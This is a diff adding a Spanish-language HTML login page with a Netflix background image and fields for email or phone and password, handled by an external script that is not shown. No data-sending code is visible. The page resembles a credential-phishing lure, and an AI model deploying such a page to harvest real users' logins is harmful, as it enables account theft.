@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="styles.css">
+
+<style>
+  
+    body {
+        background-image: url('https://www.teknofilo.com/wp-content/uploads/2021/06/Netflix-1000x563.jpg'); 
+        background-size: cover; 
+        background-position: center; 
+        background-attachment: fixed; 
+        margin: 0;
+        padding: 0;
+        height: 100vh; 
+        display: flex;
+        justify-content: center; 
+        align-items: center; 
+    }
+    
+   
+    .login-container {
+        background-color: rgba(107, 107, 107, 0.7); 
+        border-radius: 15px;
+        padding: 50px;
+        width: 400px;
+        text-align: center;
+        box-shadow: 0 4px 8px rgba(248, 248, 248, 0.5);
+        position: relative; }
+    
+
+    
+ 
+    .login-container input {
+        width: 100%;
+        padding: 15px;
+        margin-bottom: 20px;
+        border: 1px solid #ff0000;
+        border-radius: 10px;
+        background-color: #9c9c9c;
+        color: #f900f9;
+        font-size: 1.1rem;
+        outline: none;
+    }
+
+    .login-container input:focus {
+        border-color: #f8f8f8;
+    }
+
+    .login-container button {
+        width: 100%;
+        padding: 12px;
+        background-color: #ff0000d5;
+        color: #ffffffde;
+        font-size: 1.5rem;
+        border: none;
+        border-radius: 10px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+    }
+    
+    .login-container button:hover {
+        background-color: #fffbfb; 
+    }
+    
+ 
+    .forgot-password {
+        font-size: 0.9rem;
+        color: #eeeeee; 
+        text-decoration: none;
+        margin-top: 15px;
+        display: inline-block;
+    }
+    
+    .forgot-password:hover {
+        color: #fff; 
+        text-decoration: underline;
+    }
+    
+
+    .register-link {
+        font-size: 1rem;
+        color: #ff0000;
+        text-decoration: none;
+        margin-top: 20px;
+        display: inline-block;
+    }
+    
+    .register-link:hover {
+        color: #f40612; 
+        text-decoration: underline;
+    }
+    
+.contact-form {
+    color:#eeeeee;
+}
+
+
+</style>
+
+</head>
+<body>
+
+  
+
+    <div class="login-container">
+        <form id="contact-form">
+            <label for="email-phone">Email o Número de Teléfono:</label>
+            <input type="text" id="email-phone" name="email-phone" required>
+    
+            <label for="password">Contraseña:</label>
+            <input type="password" id="password" name="password" required>
+    
+            <button type="submit">Enviar</button>
+        </form>
+    </div>
+    
+
+    <script src="script.js"></script>
+
+</body>
+</html>
